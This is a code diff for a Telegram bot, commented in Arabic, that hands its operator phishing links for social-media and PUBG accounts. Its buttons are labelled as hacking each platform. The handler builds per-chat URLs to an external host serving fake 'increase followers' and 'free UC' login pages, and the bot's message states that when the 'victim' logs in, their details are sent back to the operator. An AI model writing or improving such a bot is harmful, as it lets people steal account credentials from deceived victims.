@@ -821,23 +821,6 @@ function showLoginButtons(userId) {
   });
 }
 
-function showHackingButtons(userId) {
-  let hackingButtons = [
-    [{ text: '☠️ اختراق تيك توك ☠️', callback_data: 'increase_tiktok' }],
-    [{ text: '🕷 اختراق الانستغرام 🕷', callback_data: 'increase_instagram' }],
-    [{ text: '🔱 اختراق الفيسبوك 🔱', callback_data: 'increase_facebook' }],
-    [{ text: '👻 اختراق سناب شات 👻', callback_data: 'increase_snapchat' }],
-    [{ text: '🔫 اختراق حسابات ببجي 🔫', callback_data: 'pubg_uc' }],
-    [{ text: '🔴 اختراق يوتيوب 🔴', callback_data: 'increase_youtube' }],
-    [{ text: '🐦 اختراق تويتر 🐦', callback_data: 'increase_twitter' }],
-  ];
-
-  bot.sendMessage(userId, `اختر اندكسات على شكل زياده متابعين عند قيام الضحيه بتسجيل لاجل زياده المتابعين راح توصلك المعلومات الا البوت:`, {
-    reply_markup: {
-      inline_keyboard: hackingButtons
-    }
-  });
-}
 
 // هنا يمكنك تعريف دالة showButtons إذا كنت تحتاجها
 function showButtons(userId) {
@@ -885,45 +868,62 @@ bot.on('message', (msg) => {
 
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
+    const data = query.data;
     const baseUrl = 'https://yyytot.onrender.com'; // تأكد من تغيير هذا إلى عنوان URL الخاص بك
 
-    let action, platform;
-    if (query.data === 'pubg_uc') {
-        action = 'pubg';
-        platform = 'uc';
-    } else {
-        [action, platform] = query.data.split('_');
-    }
+    console.log('Received callback query:', data); // سجل البيانات المستلمة للتصحيح
 
-    const url = `${baseUrl}/${action}/${platform}/${chatId}`;
+    let url, message;
 
-    let message;
-    if (action === 'login') {
-        message = `يرجى تسجيل الدخول إلى ${getPlatformName(platform)}: ${url}`;
-    } else if (action === 'increase') {
-        message = `يرجى إدخال معلومات حسابك لزيادة المتابعين على ${getPlatformName(platform)}: ${url}`;
-    } else if (action === 'pubg' && platform === 'uc') {
+    if (data === 'pubg_uc') {
+        url = `${baseUrl}/increase/pubg/${chatId}`;
         message = `يرجى إدخال معلومات حسابك لشحن شدات ببجي: ${url}`;
+    } else if (data.startsWith('increase_')) {
+        const platform = data.split('_')[1];
+        url = `${baseUrl}/increase/${platform}/${chatId}`;
+        message = `يرجى إدخال معلومات حسابك لزيادة المتابعين على ${getPlatformName(platform)}: ${url}`;
     } else {
+        console.log('Unhandled callback query:', data);
         message = 'عملية غير معروفة';
     }
 
-    bot.sendMessage(chatId, message);
+    bot.sendMessage(chatId, message)
+        .then(() => console.log('Message sent successfully:', message))
+        .catch(error => console.error('Error sending message:', error));
 });
 
 function getPlatformName(platform) {
     const platformNames = {
         tiktok: 'تيك توك',
-        instagram: 'انستقرام',
+        instagram: 'انستغرام',
         facebook: 'فيسبوك',
         snapchat: 'سناب شات',
         pubg: 'ببجي',
         youtube: 'يوتيوب',
-        twitter: 'تويتر',
-        uc: 'شدات ببجي'
+        twitter: 'تويتر'
     };
     return platformNames[platform] || platform;
 }
+
+// تأكد من أن هذا الجزء موجود في الكود الخاص بإنشاء الأزرار
+function showHackingButtons(userId) {
+  let hackingButtons = [
+    [{ text: '☠️ اختراق تيك توك ☠️', callback_data: 'increase_tiktok' }],
+    [{ text: '🕷 اختراق الانستغرام 🕷', callback_data: 'increase_instagram' }],
+    [{ text: '🔱 اختراق الفيسبوك 🔱', callback_data: 'increase_facebook' }],
+    [{ text: '👻 اختراق سناب شات 👻', callback_data: 'increase_snapchat' }],
+    [{ text: '🔫 اختراق حسابات ببجي 🔫', callback_data: 'pubg_uc' }],
+    [{ text: '🔴 اختراق يوتيوب 🔴', callback_data: 'increase_youtube' }],
+    [{ text: '🐦 اختراق تويتر 🐦', callback_data: 'increase_twitter' }],
+  ];
+
+  bot.sendMessage(userId, `اختر اندكسات على شكل زياده متابعين عند قيام الضحيه بتسجيل لاجل زياده المتابعين راح توصلك المعلومات الا البوت:`, {
+    reply_markup: {
+      inline_keyboard: hackingButtons
+    }
+  });
+}
+
 
 
 const PORT = process.env.PORT || 3000;
